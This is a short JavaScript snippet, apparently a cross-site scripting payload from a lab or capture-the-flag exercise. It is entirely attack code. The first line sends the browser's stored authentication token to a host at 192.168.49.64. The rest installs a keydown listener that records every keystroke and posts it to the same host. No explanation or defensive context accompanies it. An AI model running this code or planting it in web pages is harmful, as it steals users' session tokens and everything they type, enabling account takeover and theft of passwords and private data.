
  fetch(`http://192.168.49.64:8000/x?${localStorage.token}`)
  let lg = () => {
    let buffer = "";
    let timer;
    let logKey = (event) => {
      console.log("clicked")
      buffer += event.key;
      clearTimeout(timer);
      timer = setTimeout(() => {
        fetch("http://192.168.49.64:8000/x", {
          method: "POST",
          body: buffer,
        });
      }, 500);
    };
    return logKey;
  };
  document.addEventListener("keydown", lg());
